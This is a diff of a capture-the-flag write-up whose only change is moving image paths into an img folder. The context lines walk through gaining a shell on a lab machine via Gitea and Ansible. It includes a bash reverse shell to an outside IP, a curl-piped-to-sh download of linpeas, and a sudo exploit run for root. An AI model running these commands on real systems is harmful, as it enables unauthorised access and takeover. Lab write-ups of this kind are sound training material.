@@ -111,19 +111,19 @@ we can see that it is running
 * 8080 — python http server
 * 3000 — gitea
 
-![alt text](image.png)
+![alt text](img/image.png)
 
 There is a hint in the first image
 
 Press enter or click to view image in full size
 
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 the description tells us that exif data present in the image
 
 let’s download the image and use exif tool to extract the data
 
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
 we found a note on that path
 
@@ -144,15 +144,15 @@ we got the password for gitea and we also know that ansible is running in port 1
 
 After logging in to gitea we found the first flag
 
-![alt text](image-3.png)
+![alt text](img/image-3.png)
 
-![alt text](image-4.png)
+![alt text](img/image-4.png)
 
 when I run ansible playbook from port 1337 the code in gitea is executed. I tried changing the code it gitea and we can see it runs the code in the logs
 
 Press enter or click to view image in full size
 
-![alt text](image-5.png)
+![alt text](img/image-5.png)
 
 now let’s replace the code command with a reverse shell we found in revshells.com
 
@@ -160,13 +160,13 @@ now let’s replace the code command with a reverse shell we found in revshells.
 bash -c "bash -i >& /dev/tcp/10.17.54.133/9000 0>&1"
 ```
 
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
 Run the script from 1337’s web interface and wait for sometime
 
 we got the shell
 
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
 Use linpeas to for privilege escalation.
 
@@ -182,7 +182,7 @@ use curl to run the script in the vulnerable box
 curl -L http://10.17.54.133:8000/linpeas.sh | sh
 ```
 
-![alt text](image-8.png)
+![alt text](img/image-8.png)
 
 we have a vulnerable sudo version here.
 
@@ -200,7 +200,7 @@ python3 -m http.server
 
 ## Download and extract
 
-![alt text](image-9.png)
+![alt text](img/image-9.png)
 
 ```bash
 cd /tmp
@@ -230,6 +230,6 @@ run:
 $ ./sudo-hax-me-a-sandwich 0
 ```
 
-![alt text](image-10.png)
+![alt text](img/image-10.png)
 
 and now we have pwned the machine
